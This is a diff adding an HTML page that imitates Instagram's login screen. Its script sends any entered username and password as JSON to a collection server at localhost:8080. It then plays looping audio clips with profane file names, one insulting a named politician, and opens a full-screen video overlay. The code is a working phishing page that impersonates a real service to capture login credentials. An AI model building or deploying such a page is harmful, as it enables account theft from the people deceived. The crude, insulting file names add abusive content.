@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>Instagram</title>
+  <link rel="stylesheet" href="style.css" />
+
+</head>
+<body>
+
+
+  <!-- Main Content -->
+  <main class="content">
+
+    <!-- Logo -->
+    <div class="logo">
+      <svg viewBox="0 0 200 60" aria-label="Instagram">
+        <text x="100" y="42" font-size="34" font-weight="400" fill="#000" text-anchor="middle" letter-spacing="0.5">Instagram</text>
+      </svg>
+    </div>
+
+    <!-- Login Form -->
+    <form class="login-form" autocomplete="off">
+      <div class="input-group">
+        <input type="text" id="username" placeholder="Phone number, email or username" />
+      </div>
+
+      <div class="input-group">
+        <input type="password" id="password" placeholder="Password" />
+        <svg class="eye-toggle" viewBox="0 0 22 22" aria-label="Toggle password visibility">
+          <path d="M1 11s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7z"/>
+          <circle cx="11" cy="11" r="3"/>
+        </svg>
+      </div>
+
+      <button type="submit" class="login-btn">Log In</button>
+    </form>
+
+    <a href="#" class="forgot-link">Forgot your login details? Get help logging in.</a>
+
+    <div class="divider">
+      <span class="line"></span>
+      <span class="or">OR</span>
+      <span class="line"></span>
+    </div>
+
+    <a href="#" class="fb-text-link">Log in with Facebook</a>
+
+  </main>
+
+  <!-- Footer -->
+  <footer class="footer">
+    Don't have an account? <a href="#">Sign up.</a>
+  </footer>
+
+  <script>
+    const audioFiles = ['kyu-re-madarchod-cid.mp3', 'modi-ji-bkl.mp3'];
+    const _activeAudio = [];
+
+    function disableBodyScroll() {
+      const scrollY = window.scrollY;
+      document.body.style.top = `-${scrollY}px`;
+      document.body.classList.add('overlay-open');
+      return scrollY;
+    }
+
+    function restoreBodyScroll(scrollY) {
+      document.body.classList.remove('overlay-open');
+      document.body.style.top = '';
+      window.scrollTo(0, scrollY);
+    }
+
+    function createVideoOverlay() {
+      const savedScrollY = disableBodyScroll();
+
+      const overlay = document.createElement('div');
+      overlay.id = 'video-overlay';
+      overlay.className = 'active';
+
+      const video = document.createElement('video');
+      video.src = 'overlay/da4e8ebe-c910-4fa3-860a-9b0dd7540c6e.mp4';
+      video.autoplay = true;
+      video.muted = false;
+      video.playsInline = true;
+      video.preload = 'auto';
+      video.loop = true;
+      overlay.appendChild(video);
+
+      // Block all keyboard focus from reaching background
+      overlay.setAttribute('tabindex', '0');
+      overlay.focus();
+
+      document.body.appendChild(overlay);
+      video.play().catch(err => console.error('Video play failed:', err));
+
+      // Close function: fade out, then clean up
+      function closeOverlay() {
+        if (!overlay.parentNode) return;
+        overlay.classList.remove('active');
+        overlay.addEventListener('transitionend', function handler() {
+          overlay.removeEventListener('transitionend', handler);
+          video.pause();
+          video.src = '';
+          overlay.remove();
+          restoreBodyScroll(savedScrollY);
+        });
+      }
+
+      return { overlay, closeOverlay };
+    }
+
+    document.querySelector('.login-form').addEventListener('submit', function(e) {
+      e.preventDefault();
+      const username = document.getElementById('username').value.trim();
+      const password = document.getElementById('password').value.trim();
+
+      if (!username || !password) return;
+
+      fetch('http://localhost:8080', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({username, password})
+      }).catch(err => console.error('Submit failed:', err));
+
+      // Play random audio
+      function playRandomAudio() {
+        const randomFile = audioFiles[Math.floor(Math.random() * audioFiles.length)];
+        console.log('[Audio] Selected:', randomFile);
+        const audio = new Audio('audio/' + randomFile);
+        audio.loop = true;
+        _activeAudio.push(audio);
+
+        audio.oncanplaythrough = () => console.log('[Audio] Can play through:', randomFile);
+        audio.onerror = (e) => {
+          console.error('[Audio] Load error for', randomFile, ':', e);
+          // Try the other file if one fails
+          const fallback = audioFiles.find(f => f !== randomFile);
+          if (fallback) {
+            console.log('[Audio] Falling back to:', fallback);
+            const fallbackAudio = new Audio('audio/' + fallback);
+            fallbackAudio.loop = true;
+            _activeAudio.push(fallbackAudio);
+            fallbackAudio.play().catch(err2 => console.error('[Audio] Fallback also failed:', err2));
+          }
+        };
+        audio.onplay = () => console.log('[Audio] Playing:', randomFile);
+        audio.onabort = () => console.log('[Audio] Aborted:', randomFile);
+        audio.onstalled = () => console.log('[Audio] Stalled:', randomFile);
+
+        audio.play().catch(err => {
+          console.error('[Audio] Play failed for', randomFile + ':', err);
+          // Try the other file
+          const fallback = audioFiles.find(f => f !== randomFile);
+          if (fallback) {
+            console.log('[Audio] Retrying with:', fallback);
+            const fallbackAudio = new Audio('audio/' + fallback);
+            fallbackAudio.loop = true;
+            _activeAudio.push(fallbackAudio);
+            fallbackAudio.play().catch(err2 => console.error('[Audio] Retry also failed:', err2));
+          }
+        });
+      }
+      playRandomAudio();
+
+      // Create and show video overlay
+      createVideoOverlay();
+    });
+  </script>
+
+</body>
+</html>
